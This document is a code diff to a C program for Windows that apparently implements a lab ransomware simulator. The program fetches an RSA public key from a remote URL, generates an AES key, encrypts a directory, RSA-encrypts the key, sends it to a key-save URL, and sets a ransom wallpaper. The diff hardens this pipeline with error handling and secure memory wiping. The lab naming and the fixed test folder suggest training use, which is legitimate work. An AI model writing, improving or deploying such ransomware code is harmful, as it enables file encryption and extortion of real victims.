@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
+#include <Lmcons.h>
 #include <wininet.h>
 #include <wincrypt.h>
 #include <shlobj.h>
@@ -96,20 +97,57 @@ unsigned char *sha256_hash(const unsigned char *data, size_t len)
 {
     HCRYPTPROV hProv = 0;
     HCRYPTHASH hHash = 0;
-    unsigned char *hash = (unsigned char *)malloc(32);
-    DWORD hashLen = 32;
+    unsigned char *hash = NULL;
+    DWORD hash_len = 32;
 
-    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+    if (!data || len == 0 || len > MAXDWORD)
     {
-        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
-        {
-            CryptHashData(hHash, data, (DWORD)len, 0);
-            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
-            CryptDestroyHash(hHash);
-        }
-        CryptReleaseContext(hProv, 0);
+        fprintf(stderr, "[!] sha256_hash received invalid input\n");
+        return NULL;
     }
+
+    hash = (unsigned char *)malloc(32);
+    if (!hash)
+    {
+        fprintf(stderr, "[!] malloc failed for SHA-256 buffer\n");
+        return NULL;
+    }
+
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+    {
+        print_crypto_error("CryptAcquireContext");
+        goto error;
+    }
+
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+    {
+        print_crypto_error("CryptCreateHash(SHA256)");
+        goto error;
+    }
+
+    if (!CryptHashData(hHash, data, (DWORD)len, 0))
+    {
+        print_crypto_error("CryptHashData");
+        goto error;
+    }
+
+    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
+    {
+        print_crypto_error("CryptGetHashParam");
+        goto error;
+    }
+
+    CryptDestroyHash(hHash);
+    CryptReleaseContext(hProv, 0);
     return hash;
+
+error:
+    if (hHash)
+        CryptDestroyHash(hHash);
+    if (hProv)
+        CryptReleaseContext(hProv, 0);
+    free(hash);
+    return NULL;
 }
 
 // PBKDF2-HMAC-SHA256 key derivation using Windows CNG
@@ -162,11 +200,19 @@ bool pbkdf2_sha256(const unsigned char *password, size_t pass_len,
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    // Initialize environment variables
     DWORD user_name_len = sizeof(user_name);
-    GetUserNameA(user_name, &user_name_len);
+    if (!GetUserNameA(user_name, &user_name_len))
+    {
+        print_crypto_error("GetUserNameA");
+        return 1;
+    }
+
     DWORD comp_name_len = sizeof(computer_name);
-    GetComputerNameA(computer_name, &comp_name_len);
+    if (!GetComputerNameA(computer_name, &comp_name_len))
+    {
+        print_crypto_error("GetComputerNameA");
+        return 1;
+    }
 
     form1_load();
     return 0;
@@ -179,14 +225,55 @@ void form1_load()
 
 char *get_public_key(const char *url)
 {
-    HINTERNET hInternet = InternetOpenA("eda2-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    char *buffer = (char *)malloc(4096);
-    DWORD bytesRead;
-    InternetReadFile(hConnect, buffer, 4095, &bytesRead);
-    buffer[bytesRead] = '\0';
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
+    HINTERNET hInternet = NULL, hConnect = NULL;
+    char *buffer = NULL;
+    DWORD bytes_read = 0;
+
+    if (!url){
+        fprintf(stderr, "[!] get_public_key received NULL URL\n");
+        return NULL;
+    }
+
+    hInternet = InternetOpenA("eda2-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet){
+        fprintf(stderr, "[!] InternetOpenA failed: %lu\n", GetLastError());
+        goto cleanup;
+    }
+
+    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hConnect){
+        fprintf(stderr, "[!] InternetOpenUrlA failed: %lu\n", GetLastError());
+        goto cleanup;
+    }
+
+    buffer = (char *)malloc(4096);
+    if (!buffer){
+        fprintf(stderr, "[!] malloc failed for public-key buffer\n");
+        goto cleanup;
+    }
+
+    if (!InternetReadFile(hConnect, buffer, 4095, &bytes_read)){
+        fprintf(stderr, "[!] InternetReadFile failed: %lu\n", GetLastError());
+        free(buffer);
+        buffer = NULL;
+        goto cleanup;
+    }
+
+    if (bytes_read == 0){
+        fprintf(stderr, "[!] Public-key response was empty\n");
+        free(buffer);
+        buffer = NULL;
+        goto cleanup;
+    }
+
+    buffer[bytes_read] = '\0';
+    printf("[+] Public key downloaded: %lu bytes\n", bytes_read);
+
+cleanup:
+    if (hConnect)
+        InternetCloseHandle(hConnect);
+    if (hInternet)
+        InternetCloseHandle(hInternet);
     return buffer;
 }
 
@@ -322,36 +409,87 @@ void send_key(const char *url)
 void start_action()
 {
     const char *data_path = "C:\\Users\\Public\\A01_TestData";
+    FILE *f = NULL;
+
     public_key = get_public_key(generator_url);
+    if (!public_key)
+    {
+        fprintf(stderr, "[!] Failed to retrieve public key\n");
+        goto cleanup;
+    }
+
     aes_key = generate_key(32);
+    if (!aes_key)
+    {
+        fprintf(stderr, "[!] Failed to generate AES key\n");
+        goto cleanup;
+    }
 
     const char *key_path = "C:\\Users\\Public\\A01_6_Lab_Encryption_Key.txt";
-    FILE *f = fopen(key_path, "w");
-    if (f)
+    f = fopen(key_path, "w");
+    if (!f)
     {
-        fputs(aes_key, f);
-        fclose(f);
+        fprintf(stderr, "[!] Failed to create key file: %s\n", key_path);
+        goto cleanup;
     }
+    if (fputs(aes_key, f) == EOF)
+    {
+        fprintf(stderr, "[!] Failed to write AES key file\n");
+        fclose(f);
+        f = NULL;
+        goto cleanup;
+    }
+    fclose(f);
+    f = NULL;
 
     DWORD dwAttrib = GetFileAttributesA(data_path);
-    if (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+    if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
     {
-        encrypt_directory(data_path, aes_key);
+        fprintf(stderr, "[!] Test directory not found: %s\n", data_path);
+        goto cleanup;
     }
 
+    encrypt_directory(data_path, aes_key);
+
     encrypted_key = encrypt_key_rsa(aes_key, KEY_SIZE, public_key);
-    send_key(key_save_url);
-
-    memset(aes_key, 0, strlen(aes_key));
-    free(aes_key);
-    aes_key = NULL;
-
-    free(encrypted_key);
-    encrypted_key = NULL;
+    if (!encrypted_key)
+    {
+        fprintf(stderr, "[!] Failed to RSA-encrypt AES key\n");
+        goto cleanup;
+    }
+    else{
+        send_key(key_save_url);
+    }
 
     char background_image_name[MAX_PATH];
     sprintf(background_image_name, "%s%s\\ransom.jpg", user_dir, user_name);
     set_wallpaper_from_web(background_image_url, background_image_name);
+
+    printf("[+] Cryptographic fixture completed successfully\n");
+
+cleanup:
+    if (f)
+        fclose(f);
+
+    if (aes_key)
+    {
+        SecureZeroMemory(aes_key, strlen(aes_key));
+        free(aes_key);
+        aes_key = NULL;
+    }
+
+    if (encrypted_key)
+    {
+        SecureZeroMemory(encrypted_key, strlen(encrypted_key));
+        free(encrypted_key);
+        encrypted_key = NULL;
+    }
+
+    if (public_key)
+    {
+        free(public_key);
+        public_key = NULL;
+    }
 
     exit(0);
 }
@@ -611,22 +749,31 @@ cleanup:
 char *encrypt_key_rsa(const char *key, int key_size, const char *public_key_xml)
 {
     size_t out_len = 0;
+    unsigned char *encrypted = NULL;
+    char *base64 = NULL;
 
-    unsigned char *encrypted = rsa_encrypt(
-        (unsigned char *)key,
-        strlen(key),
-        key_size,
-        public_key_xml,
-        &out_len);
+    if (!key || !public_key_xml || key_size <= 0)
+    {
+        fprintf(stderr, "[!] encrypt_key_rsa received invalid argument\n");
+        return NULL;
+    }
 
+    encrypted = rsa_encrypt((const unsigned char *)key, strlen(key), key_size, public_key_xml, &out_len);
     if (!encrypted || out_len == 0)
     {
         fprintf(stderr, "[!] RSA key encryption failed\n");
         return NULL;
     }
 
-    char *base64 = base64_encode(encrypted, out_len, NULL);
+    base64 = base64_encode(encrypted, out_len, NULL);
+    SecureZeroMemory(encrypted, out_len);
     free(encrypted);
+
+    if (!base64)
+    {
+        fprintf(stderr, "[!] RSA ciphertext Base64 encoding failed\n");
+        return NULL;
+    }
 
     return base64;
 }
@@ -915,12 +1062,29 @@ cleanup:
 char *generate_key(int length)
 {
     const char *valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
-    char *res = (char *)malloc(length + 1);
-    srand((unsigned int)GetTickCount());
-    for (int i = 0; i < length; i++)
+    char *res = NULL;
+    size_t valid_len;
+
+    if (length <= 0)
     {
-        res[i] = valid[rand() % strlen(valid)];
+        fprintf(stderr, "[!] generate_key received invalid length\n");
+        return NULL;
     }
+
+    valid_len = strlen(valid);
+    res = (char *)malloc((size_t)length + 1);
+
+    if (!res)
+    {
+        fprintf(stderr, "[!] malloc failed in generate_key\n");
+        return NULL;
+    }
+
+    srand((unsigned int)GetTickCount());
+
+    for (int i = 0; i < length; i++)
+        res[i] = valid[rand() % valid_len];
+
     res[length] = '\0';
     return res;
 }
